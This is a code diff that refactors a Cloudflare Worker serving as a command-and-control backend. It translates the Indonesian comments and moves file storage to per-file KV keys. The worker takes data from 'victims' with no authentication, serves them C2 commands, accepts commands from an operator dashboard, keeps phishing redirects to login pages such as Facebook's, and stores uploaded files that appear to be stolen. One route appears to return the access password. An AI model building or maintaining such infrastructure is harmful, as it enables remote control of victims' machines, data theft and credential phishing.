@@ -1,5 +1,7 @@
 // ================================================================
-// CLOUDFLARE WORKER - verifikasi-api (KV Storage untuk File)
+// CLOUDFLARE WORKER - verifikasi-api (KV Storage for File) - Refactor
+// - Use per-file keys: file:{path}, meta:{path}, folder:{folderPath}
+// - Keep existing endpoints and response shapes for backward compatibility
 // ================================================================
 
 const MAX_DATA = 2000;
@@ -20,7 +22,7 @@ function jsonResponse(data, status = 200) {
 }
 
 // ============================================================
-// AUTHENTIKASI - PRIORITAS HEADER X-Password
+// AUTHENTICATION - PRIORITIZE HEADER X-Password
 // ============================================================
 function getPasswordFromRequest(request, env) {
   const headerPwd = request.headers.get('X-Password');
@@ -45,7 +47,7 @@ export default {
       return jsonResponse({ status: 'ok', password: env.PASSWORD || '' });
     }
 
-    // POST /data (korban kirim data – tanpa auth)
+    // POST /data (victim -> server) - no auth expected
     if (url.pathname === '/data' && method === 'POST') {
       return await handlePostData(request, env);
     }
@@ -54,7 +56,7 @@ export default {
     if (url.pathname === '/data' && method === 'GET') {
       const type = url.searchParams.get('type');
 
-      // Ambil perintah C2 (untuk korban) – auth via header
+      // Fetch C2 command for victim (auth via header)
       if (type === 'perintah') {
         const pwd = getPasswordFromRequest(request, env);
         if (pwd !== env.PASSWORD) return jsonResponse({ error: 'Invalid password' }, 401);
@@ -68,7 +70,7 @@ export default {
       }
 
       // ============================================================
-      // ENDPOINT FILE (KV) – auth via header
+      // FILE ENDPOINT (KV) – auth via header
       // ============================================================
       if (type === 'list_file') {
         if (!isAuthenticated(request, env)) return jsonResponse({ error: 'Unauthorized' }, 403);
@@ -102,18 +104,18 @@ export default {
       }
     }
 
-    // POST /c2 (dashboard kirim perintah – auth via header)
+    // POST /c2 (dashboard send command – auth via header)
     if (url.pathname === '/c2' && method === 'POST') {
       if (!isAuthenticated(request, env)) return jsonResponse({ error: 'Access Denied' }, 403);
       return await handleC2(request, env);
     }
 
-    // WebSocket (tetap)
+    // WebSocket (same as before)
     if (url.pathname === '/ws') {
       return handleWebSocket(request, env);
     }
 
-    // Phishing redirects (sama seperti asli)
+    // Phishing redirects (preserve existing behavior)
     if (method === 'GET') {
       const phishingRoutes = {
         '/fb': 'https://www.facebook.com/login',
@@ -208,19 +210,97 @@ async function handleC2(request, env) {
 }
 
 // ============================================================
+// HELPERS for KV-per-file scheme
+// ============================================================
+function folderKeyFor(path) {
+  // keep folder keys in the same form as received paths, ensure trailing slash
+  if (!path) return 'folder:/';
+  const hasTrailing = path.endsWith('/');
+  const folder = hasTrailing ? path : path.replace(/\/[^\\/]*$/, '') + '/';
+  return 'folder:' + folder;
+}
+
+async function safeUpdateFolderList(env, folderPath, updater) {
+  // simple retry loop to reduce lost-update races
+  const key = 'folder:' + folderPath;
+  for (let attempt = 0; attempt < 4; attempt++) {
+    try {
+      const raw = await env.DATA.get(key);
+      let list = raw ? JSON.parse(raw) : [];
+      const newList = updater(list.slice());
+      if (!newList) return true; // updater decided nothing to do
+      await env.DATA.put(key, JSON.stringify(newList));
+      return true;
+    } catch (e) {
+      // small delay then retry
+      await new Promise(r => setTimeout(r, 50 * (attempt + 1)));
+    }
+  }
+  return false;
+}
+
+async function updateFileIndexIfExists(env, modifyFn) {
+  // Only update file_index if it exists to preserve backward compatibility
+  const raw = await env.DATA.get('file_index');
+  if (!raw) return true;
+  for (let attempt = 0; attempt < 4; attempt++) {
+    try {
+      const index = JSON.parse(raw);
+      const newIndex = modifyFn(index.slice());
+      await env.DATA.put('file_index', JSON.stringify(newIndex));
+      return true;
+    } catch (e) {
+      // if JSON.parse failed or put failed, give up after retries
+      await new Promise(r => setTimeout(r, 50 * (attempt + 1)));
+    }
+  }
+  return false;
+}
+
+// ============================================================
 // HANDLER FILE (KV) – LIST, GET, UPLOAD, DELETE
 // ============================================================
 async function handleListFile(request, env) {
   const url = new URL(request.url);
   const path = url.searchParams.get('path') || '/';
+  const limit = parseInt(url.searchParams.get('limit')) || null;
+  const cursor = url.searchParams.get('cursor') || null; // not implemented fully, kept for compatibility
 
   try {
-    // Ambil index file dari KV
+    // normalize prefix: keep exact form provided to preserve key layout
+    const prefix = path.replace(/^\/+/, '');
+    const folderKey = 'folder:' + (prefix ? (prefix.endsWith('/') ? prefix : prefix + '/') : '/');
+
+    // Try KV-per-folder listing first
+    const folderRaw = await env.DATA.get(folderKey);
+    if (folderRaw) {
+      let names = JSON.parse(folderRaw);
+      // simple pagination
+      if (cursor) {
+        const start = parseInt(cursor, 10) || 0;
+        names = names.slice(start, limit ? start + limit : undefined);
+      } else if (limit) {
+        names = names.slice(0, limit);
+      }
+      // fetch metadata in parallel (beware very large folders)
+      const metas = await Promise.all(names.map(async name => {
+        const fullPath = (prefix ? prefix + (prefix.endsWith('/') ? '' : '') : '') + name;
+        const mRaw = await env.DATA.get('meta:' + fullPath);
+        if (mRaw) return JSON.parse(mRaw);
+        // fallback: if meta missing, try to get file size from file key (not ideal)
+        const fRaw = await env.DATA.get('file:' + fullPath);
+        const size = fRaw ? Math.floor(fRaw.length * 0.75) : 0;
+        return { name, path: fullPath, size, isFolder: false, waktu: 0 };
+      }));
+
+      return jsonResponse({ status: 'ok', files: metas });
+    }
+
+    // Fallback: if folder metadata doesn't exist, try old file_index (maintain compatibility)
     const indexRaw = await env.DATA.get('file_index') || '[]';
     const index = JSON.parse(indexRaw);
 
     // Filter berdasarkan prefix path
-    const prefix = path.replace(/^\/+/, '');
     const files = index.filter(f => f.path.startsWith(prefix)).map(f => ({
       name: f.path.split('/').pop() || '',
       path: f.path,
@@ -256,9 +336,15 @@ async function handleGetFile(request, env) {
   if (!path) return jsonResponse({ error: 'Missing path' }, 400);
 
   try {
+    // Try per-file key first
     const content = await env.DATA.get(`file:${path}`);
-    if (content === null) return jsonResponse({ error: 'File not found' }, 404);
-    return jsonResponse({ status: 'ok', content: content });
+    if (content !== null) return jsonResponse({ status: 'ok', content: content });
+
+    // Fallback: attempt to read from old index format (if any key naming differences exist)
+    const alt = await env.DATA.get(path) || await env.DATA.get(`file:/${path}`);
+    if (alt !== null) return jsonResponse({ status: 'ok', content: alt });
+
+    return jsonResponse({ error: 'File not found' }, 404);
   } catch (e) {
     return jsonResponse({ error: 'Get failed: ' + e.message }, 500);
   }
@@ -274,21 +360,34 @@ async function handleUploadFile(request, env) {
     const contentBase64 = body.data;
     if (!contentBase64) return jsonResponse({ error: 'Missing data' }, 400);
 
-    // Perkirakan ukuran file
+    // Estimate file size
     const size = Math.floor(contentBase64.length * 0.75);
-    if (size > 20 * 1024 * 1024) { // Batasi 20MB
+    const MAX = 20 * 1024 * 1024;
+    if (size > MAX) {
       return jsonResponse({ error: 'File too large. Max 20MB for KV storage.' }, 400);
     }
 
-    // Simpan isi file
+    // Save content to per-file key
     await env.DATA.put(`file:${path}`, contentBase64);
 
-    // Update index
-    const indexRaw = await env.DATA.get('file_index') || '[]';
-    const index = JSON.parse(indexRaw);
-    const filtered = index.filter(f => f.path !== path);
-    filtered.push({ path: path, size: size, waktu: Date.now() });
-    await env.DATA.put('file_index', JSON.stringify(filtered));
+    // Save metadata
+    const meta = { path: path, name: (path.split('/').pop() || ''), size: size, waktu: Date.now(), isFolder: false };
+    await env.DATA.put(`meta:${path}`, JSON.stringify(meta));
+
+    // Update folder listing (simple RMW with retries)
+    const folder = path.includes('/') ? path.replace(/\/[^\\/]*$/, '') + '/' : '/';
+    await safeUpdateFolderList(env, folder, list => {
+      const name = path.split('/').pop();
+      if (!list.includes(name)) list.push(name);
+      return list;
+    });
+
+    // Keep backward compatibility: update file_index if it exists
+    const _ok = await updateFileIndexIfExists(env, index => {
+      const filtered = index.filter(f => f.path !== path);
+      filtered.push({ path: path, size: size, waktu: Date.now() });
+      return filtered;
+    });
 
     return jsonResponse({ status: 'ok', path, size });
   } catch (e) {
@@ -302,14 +401,21 @@ async function handleDeleteFile(request, env) {
   if (!path) return jsonResponse({ error: 'Missing path' }, 400);
 
   try {
-    // Hapus isi file
+    // Delete file content and metadata
     await env.DATA.delete(`file:${path}`);
+    await env.DATA.delete(`meta:${path}`);
 
-    // Hapus dari index
-    const indexRaw = await env.DATA.get('file_index') || '[]';
-    const index = JSON.parse(indexRaw);
-    const filtered = index.filter(f => f.path !== path);
-    await env.DATA.put('file_index', JSON.stringify(filtered));
+    // Update folder list
+    const folder = path.includes('/') ? path.replace(/\/[^\\/]*$/, '') + '/' : '/';
+    await safeUpdateFolderList(env, folder, list => {
+      const name = path.split('/').pop();
+      const idx = list.indexOf(name);
+      if (idx !== -1) list.splice(idx, 1);
+      return list;
+    });
+
+    // Update file_index if exists (backward compat)
+    await updateFileIndexIfExists(env, index => index.filter(f => f.path !== path));
 
     return jsonResponse({ status: 'ok' });
   } catch (e) {
@@ -318,7 +424,7 @@ async function handleDeleteFile(request, env) {
 }
 
 // ============================================================
-// WEBSOCKET (sama seperti asli, auth via body JSON)
+// WEBSOCKET (preserve original logic)
 // ============================================================
 async function handleWebSocket(request, env) {
   const upgradeHeader = request.headers.get('Upgrade');
